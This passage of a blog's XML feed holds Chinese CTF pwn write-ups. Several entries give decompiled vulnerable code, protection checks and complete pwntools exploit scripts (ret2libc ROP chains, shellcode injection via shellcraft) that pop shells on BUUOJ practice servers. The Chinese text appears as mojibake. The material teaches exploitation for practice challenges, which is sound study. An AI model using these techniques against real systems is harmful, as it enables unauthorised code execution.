class="number">0x8</span></span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">start_got=elf.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">vul=<span class="number">0x40067D</span></span><br><span class="line">pop_ret=<span class="number">0x400733</span></span><br><span class="line">ret=<span class="number">0x4004c9</span> </span><br><span class="line">payload=cyclic(offset)+p64(pop_ret)+p64(start_got)+p64(puts_plt)+p64(vul)</span><br><span class="line"></span><br><span class="line">pause(<span class="number">1</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Pull up your sword and tell me u story!&#x27;</span>,payload)</span><br><span class="line">io.recvline()</span><br><span class="line">start_addr=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">info(<span class="string">&#x27;start:&#x27;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>((start_addr))))</span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;__libc_start_main&#x27;</span>,start_addr)</span><br><span class="line">base=start_addr-libc.dump(<span class="string">&#x27;__libc_start_main&#x27;</span>)s</span><br><span class="line">system=base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh=base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">payload=cyclic(offset)+p64(pop_ret)+p64(bin_sh)+p64(system)</span><br><span class="line"></span><br><span class="line">pause(<span class="number">1</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Pull up your sword and tell me u story!&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;&quot;&gt;&lt;/h2&gt;
&lt;hr&gt;
&lt;h2 id=&quot;æ‘˜è¦&quot;&gt;æ‘˜è¦&lt;/h2&gt;
&lt;p&gt;ç»å…¸çš„x64ä¸‹çš„ret2libc3é¢˜ç›®,æœ€è¿‘åšç®€å•é¢˜æœ‰ç‚¹éº»äº†,ä¸è¿‡è¿˜æ˜¯æœ‰ä¸€äº›å·¥å…·ä½¿ç”¨çš„å°ç»†èŠ‚å¯ä»¥ç§¯ç´¯çš„.&lt;/p&gt;
&lt;h2 id=&quot;1-é€†å‘&quot;&gt;1.é€†å‘&lt;/h2&gt;
&lt;figure class=&quot;</summary>
      
    
    
    
    <category term="é¢˜è§£" scheme="https://www.fomal.cc/categories/%E9%A2%98%E8%A7%A3/"/>
    
    
  </entry>
  
  <entry>
    <title>é“äººä¸‰é¡¹(ç¬¬äº”èµ›åŒº)_2018_rop</title>
    <link href="https://www.fomal.cc/posts/e9e8a63.html"/>
    <id>https://www.fomal.cc/posts/e9e8a63.html</id>
    <published>2023-04-07T05:09:06.877Z</published>
    <updated>2023-04-09T06:22:56.737Z</updated>
    
    <content type="html"><![CDATA[<h2 id="æ‘˜è¦">æ‘˜è¦</h2><p>x86ç®€å•ROPé¢˜,æ‹¿æ¥å¤ä¹ ä¸€ä¸‹å·¥å…·</p><h2 id="1-é€†å‘">1.é€†å‘</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vulnerable_function</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">136</span>]; <span class="comment">// [esp+10h] [ebp-88h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">256u</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  be_nice_to_people();</span><br><span class="line">  vulnerable_function();</span><br><span class="line">  <span class="keyword">return</span> write(<span class="number">1</span>, <span class="string">&quot;Hello, World\n&quot;</span>, <span class="number">0xD</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-æ¼æ´åˆ†æ">2.æ¼æ´åˆ†æ</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">  RELRO:    Partial RELRO</span><br><span class="line">  Stack:    No canary found</span><br><span class="line">  NX:       NX enabled</span><br><span class="line">  PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>x86çš„ç¨‹åºåªå¼€äº†éƒ¨åˆ†RELROå’ŒNXä¿æŠ¤,å‘ç°æœ‰å¾ˆæ˜æ˜¾çš„æ ˆæº¢å‡ºæ¼æ´,IDAé‡Œæ²¡æœ‰å‘ç°<code>system()</code>å’Œ<code>bin/sh</code>,è¿™é‡Œä¹Ÿæ²¡æœ‰å¤šä½™çš„èŠ±æ ·.ç›´æ¥æ³„éœ²ä¸€ä¸‹gotç„¶åæ‰¾ä¸€ä¸‹glibcç‰ˆæœ¬å¸ƒç½®ä¸€ä¸‹ROPå°±èƒ½æ‹¿åˆ°shelläº†,æœ€åé™„ä¸Šexp.</p><h2 id="3-exploit">3.exploit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25522</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./rop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset=<span class="number">0x88</span>+<span class="number">0x4</span></span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main=<span class="number">0x80484C6</span></span><br><span class="line"></span><br><span class="line">payload=cyclic(offset)+p32(write_plt)+p32(main)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>) <span class="comment">##åªè¦å‘é€å››ä¸ªå°±å¤Ÿäº†</span></span><br><span class="line"></span><br><span class="line">pause(<span class="number">1</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">write_addr=u32(io.recv(<span class="number">4</span>)) <span class="comment">##æ¥æ”¶ä¹Ÿæ˜¯å››ä¸ª</span></span><br><span class="line">info(<span class="string">&quot;write:&quot;</span>+(<span class="built_in">str</span>)(write_addr))</span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line">base=write_addr-libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">system=base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh=base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=cyclic(offset)+p32(system)+p32(<span class="number">0xdeadbeef</span>)+p32(bin_sh)</span><br><span class="line"></span><br><span class="line">pause(<span class="number">1</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;æ‘˜è¦&quot;&gt;æ‘˜è¦&lt;/h2&gt;
&lt;p&gt;x86ç®€å•ROPé¢˜,æ‹¿æ¥å¤ä¹ ä¸€ä¸‹å·¥å…·&lt;/p&gt;
&lt;h2 id=&quot;1-é€†å‘&quot;&gt;1.é€†å‘&lt;/h2&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span c</summary>
      
    
    
    
    <category term="é¢˜è§£" scheme="https://www.fomal.cc/categories/%E9%A2%98%E8%A7%A3/"/>
    
    
  </entry>
  
  <entry>
    <title>ciscn_2019_n_5 WP</title>
    <link href="https://www.fomal.cc/posts/d7f9e082.html"/>
    <id>https://www.fomal.cc/posts/d7f9e082.html</id>
    <published>2023-04-06T06:29:09.200Z</published>
    <updated>2023-04-09T06:23:31.041Z</updated>
    
    <content type="html"><![CDATA[<h2 id="æ‘˜è¦">æ‘˜è¦</h2><p>ret2shellcodeå…¥é—¨é¢˜,å€Ÿç€è¿™é¢˜å¤ä¹ ä¸€ä¸‹ret2shellcodeå„ç§å·¥å…·çš„ä½¿ç”¨ç»†èŠ‚.</p><h2 id="1-é€†å‘">1.é€†å‘</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> text[<span class="number">30</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;tell me your name&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, name, <span class="number">0x64</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;wow~ nice name!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What do you want to say to me?&quot;</span>);</span><br><span class="line">  gets(text);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-åˆ†æ">2.åˆ†æ</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°åªå¼€å¯äº†NXç‰‡æ®µ,ä¸è¿‡å­˜åœ¨RWXç‰‡æ®µ,ç”¨ROPgadgetæŸ¥äº†ä¸€ä¸‹å‘ç°æ²¡æœ‰ç°æˆçš„ä¼ å‚æŒ‡ä»¤,é‚£ä¹ˆret2libcå°±æœ‰ç‚¹éš¾äº†,è¿™é‡Œå› ä¸ºæœ‰ä¸ª.bssæ®µä¸Šå…¨å±€å˜é‡<code>name</code>,è™½ç„¶æœ¬åœ°ç”¨vammapæŸ¥å‡ºæ¥æ²¡æœ‰RWXæƒé™,æŠ±ç€è¯•ä¸€è¯•çš„å¿ƒæ€è¿˜æ˜¯å†³å®šæŠŠshellcodeè¯»åˆ°<code>name</code>ç„¶åretå›å»,ç„¶åå°±æˆäº†.</p><h2 id="3-exploit">3.exploit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27133</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">offset=<span class="number">0x20</span>+<span class="number">0x8</span></span><br><span class="line">name=<span class="number">0x601080</span></span><br><span class="line">read=elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line">ret=<span class="number">0x4004c9</span></span><br><span class="line"></span><br><span class="line">pause(<span class="number">1</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;tell me your name&#x27;</span>,shellcode)</span><br><span class="line"></span><br><span class="line">payload=cyclic(offset)+p64(ret)+p64(name)</span><br><span class="line"></span><br><span class="line">pause(<span class="number">1</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;What do you want to say to me?&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="4-shellcraftä½¿ç”¨å°ç»“">4.shellcraftä½¿ç”¨å°ç»“</h2><p>shellcrafté»˜è®¤å‡ºæ¥çš„æ˜¯x86è€Œä¸æ˜¯x64çš„æ±‡ç¼–,è¿™é‡Œæœ‰ä¸¤ç§æ–¹æ³•å¯ä»¥ç”¨shellcraftå†™å‡ºx64,ä¸€ç§å°±æ˜¯ä¸Šé¢çš„expé‡Œå…ˆå£°æ˜arch,ç„¶åç›´æ¥<code>shellcraft.sh()</code>,è¿™é‡Œä¹Ÿå¯ä»¥åŠ ä¸­é—´çš„amd64å‚æ•°.</p><p>è¿˜æœ‰ä¸€ç§æ˜¯<code>shellcraft.amd64.sh()</code>ç›´æ¥æ¥,ä¸è¿‡è¿™é“ç¬”è€…æ²¡å£°æ˜æ¶æ„ç›´æ¥ç”Ÿæˆå°±åºŸäº†,ç›®å‰è¿˜ä¸æ¸…æ¥šåŸå› ,å³ä½¿è¿™ä¸¤ç§æ–¹å¼éƒ½æ˜¯ä¸€æ ·çš„ä»£ç ,ä¸è¿‡æ±‡ç¼–å™¨å¥½åƒæœ‰ç‚¹é—®é¢˜.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;æ‘˜è¦&quot;&gt;æ‘˜è¦&lt;/h2&gt;
&lt;p&gt;ret2shellcodeå…¥é—¨é¢˜,å€Ÿç€è¿™é¢˜å¤ä¹ ä¸€ä¸‹ret2shellcodeå„ç§å·¥å…·çš„ä½¿ç”¨ç»†èŠ‚.&lt;/p&gt;
&lt;h2 id=&quot;1-é€†å‘&quot;&gt;1.é€†å‘&lt;/h2&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;</summary>
      
    
    
    
    <category term="é¢˜è§£" scheme="https://www.fomal.cc/categories/%E9%A2%98%E8%A7%A3/"/>
    
    
  </entry>
  
  <entry>
    <title>not_the_same_3dsctf_2016</title>
    <link href="https://www.fomal.cc/posts/de339b6d.html"/>
    <id>https://www.fomal.cc/posts/de339b6d.html</id>
    <published>2023-04-05T15:56:38.055Z</published>
    <updated>2023-04-09T06:24:22.845Z</updated>
    
    <content type="html"><![CDATA[<h2 id="æ‘˜è¦">æ‘˜è¦</h2><p>ä¸€é“å¾ˆç®€å•çš„ret2libc1,ä½†æ˜¯è¢«ç»†èŠ‚è–„çº±.</p><h2 id="1-é€†å‘">1.é€†å‘</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">get_secret</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// esi</span></span><br><span class="line"></span><br><span class="line">  v0 = fopen(<span class="string">&quot;flag.txt&quot;</span>, &amp;unk_80CF91B);</span><br><span class="line">  fgets(&amp;fl4g, <span class="number">45</span>, v0);</span><br><span class="line">  <span class="keyword">return</span> fclose(v0);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v4[<span class="number">45</span>]; <span class="comment">// [esp+Fh] [ebp-2Dh] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;b0r4 v3r s3 7u 4h o b1ch4o m3m0... &quot;</span>);</span><br><span class="line">  gets(v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-åˆ†æ">2.åˆ†æ</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>ç¨‹åºæ˜¯é™æ€é“¾æ¥,ä¸è¿‡ä¹Ÿæ²¡æœ‰ç»™å‡º<code>system()</code>,çœ‹åˆ°æœ‰ä¸€ä¸ªåé—¨å‡½æ•°ç›´æ¥æŠŠflagè¯»è¿›bssæ®µé‡Œ,ä½†æ˜¯æ²¡æœ‰ç›´æ¥è¾“å‡º,è¿™é‡Œå°±éœ€è¦æ„é€ ROPé“¾æ¥è§£å†³,è¿™é‡Œåˆšå¥½æœ‰<code>write()</code>å°±ç›´æ¥ç”¨äº†,å†çœ‹æ±‡ç¼–:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">; int get_secret()</span><br><span class="line">public get_secret</span><br><span class="line">get_secret proc near</span><br><span class="line"></span><br><span class="line">var_1C= dword ptr -1Ch</span><br><span class="line">var_18= dword ptr -18h</span><br><span class="line">var_14= dword ptr -14h</span><br><span class="line"></span><br><span class="line">push    esi</span><br><span class="line">sub     esp, 18h</span><br><span class="line">mov     [esp+1Ch+var_18], offset unk_80CF91B</span><br><span class="line">mov     [esp+1Ch+var_1C], offset aFlagTxt ; &quot;flag.txt&quot;</span><br><span class="line">call    fopen</span><br><span class="line">mov     esi, eax</span><br><span class="line">mov     [esp+1Ch+var_14], esi</span><br><span class="line">mov     [esp+1Ch+var_18], 2Dh ; &#x27;-&#x27;</span><br><span class="line">mov     [esp+1Ch+var_1C], offset fl4g</span><br><span class="line">call    fgets</span><br><span class="line">mov     [esp+1Ch+var_1C], esi</span><br><span class="line">call    fclose</span><br><span class="line">add     esp, 18h</span><br><span class="line">pop     esi</span><br><span class="line">retn</span><br><span class="line">get_secret endp</span><br></pre></td></tr></table></figure><p>è°ƒç”¨<code>main()</code>æ—¶å¹¶æ²¡æœ‰å‹å…¥ebp,æ‰€ä»¥ç›´æ¥ç”¨IDAç»™çš„åç§»ä¸ç”¨åŠ 0x4,ç”±äºå‡½æ•°æ²¡æœ‰å…³ç¼“å†²åŒº,æ‰€ä»¥æˆ‘ä»¬åœ¨ä½¿ç”¨<code>write()</code>æ‰“å°flagçš„æ—¶å€™è¿˜éœ€è¦è¿½åŠ ä¸€ä¸ª<code>exit()</code>æ¥å…³é—­ç¨‹åºè®©ç¼“å†²åŒºçš„flagè¢«åå‡ºæ¥.</p><p>ç„¶åå°±æ˜¯æŠŠç¬”è€…è–„çº±çš„åœ°å€å‰å¯¼0é—®é¢˜äº†,ä¹‹å‰ç”¨çš„å¤§å¤šæ•°éƒ½æ˜¯pwntoolsçš„æ–¹æ³•æ¥å–åœ°å€,è¿™æ¬¡å¿ƒè¡€æ¥æ½®ç›´æ¥IDAé‡Œå¤åˆ¶å¸¦ä¸Šäº†å‰å¯¼çš„0,æ²¡æœ‰æ‰“é€šğŸ˜­,åæ¥ç”¨äº†pwntoolsæ‰“å°äº†åœ°å€å¯¹æ¯”æ‰å‘ç°é—®é¢˜,æœ€åé™„ä¸Šexp.</p><h2 id="3-exploit">3.exploit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line"><span class="comment">#io=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25236</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset=<span class="number">0x2d</span></span><br><span class="line">get_secret=<span class="number">0x80489A0</span></span><br><span class="line">write=<span class="number">0x806E270</span> <span class="comment">##ç»†èŠ‚ä¸åŠ å‰å¯¼0å¦åˆ™ä¸é€š</span></span><br><span class="line">flag=<span class="number">0x80ECA2D</span></span><br><span class="line">exit=<span class="number">0x804E660</span></span><br><span class="line"><span class="comment">#pop3_ret=0x80483b8</span></span><br><span class="line"></span><br><span class="line">payload=cyclic(offset)+p32(get_secret)+p32(write)+p32(exit)+p32(<span class="number">1</span>)+p32(flag)+p32(<span class="number">45</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="4-æ€»ç»“">4.æ€»ç»“</h2><p>åœ°å€åˆ«åŠ å‰å¯¼0! ğŸ˜­</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;æ‘˜è¦&quot;&gt;æ‘˜è¦&lt;/h2&gt;
&lt;p&gt;ä¸€é“å¾ˆç®€å•çš„ret2libc1,ä½†æ˜¯è¢«ç»†èŠ‚è–„çº±.&lt;/p&gt;
&lt;h2 id=&quot;1-é€†å‘&quot;&gt;1.é€†å‘&lt;/h2&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;</summary>
      
    
    
    
    <category term="é¢˜è§£" scheme="https://www.fomal.cc/categories/%E9%A2%98%E8%A7%A3/"/>
    
    
  </entry>
  
  <entry>
    <title>ciscn_2019_en_2</title>
    <link href="https://www.fomal.cc/posts/1d3978ed.html"/>
    <id>https://www.fomal.cc/posts/1d3978ed.html</id>
    <published>2023-04-05T11:41:24.110Z</published>
    <updated>2023-04-09T06:23:22.396Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€">å‰è¨€</h2><p>ret2libc3åŠ ä¸Šä¸€ä¸ª<code>strlen()</code>é‡åˆ°â€™<code>\x00'</code>å°±ä¼šåœä¸‹çš„çŸ¥è¯†ç‚¹,è¿˜æ˜¯æœ‰ä¸€äº›ç»†èŠ‚è¦æ³¨æ„çš„.</p><h2 id="1-ä¼ªä»£ç ">1.ä¼ªä»£ç </h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">encrypt</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">48</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line">  __int16 v3; <span class="comment">// [rsp+30h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input your Plaintext to be encrypted&quot;</span>);</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = (<span class="type">unsigned</span> <span class="type">int</span>)x;</span><br><span class="line">    <span class="keyword">if</span> ( v0 &gt;= <span class="built_in">strlen</span>(s) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( s[x] &lt;= <span class="number">96</span> || s[x] &gt; <span class="number">122</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( s[x] &lt;= <span class="number">64</span> || s[x] &gt; <span class="number">90</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( s[x] &gt; <span class="number">47</span> &amp;&amp; s[x] &lt;= <span class="number">57</span> )</span><br><span class="line">          s[x] ^= <span class="number">0xC</span>u;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        s[x] ^= <span class="number">0xD</span>u;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      s[x] ^= <span class="number">0xE</span>u;</span><br><span class="line">    &#125;</span><br><span class="line">    ++x;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Ciphertext&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(s);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> 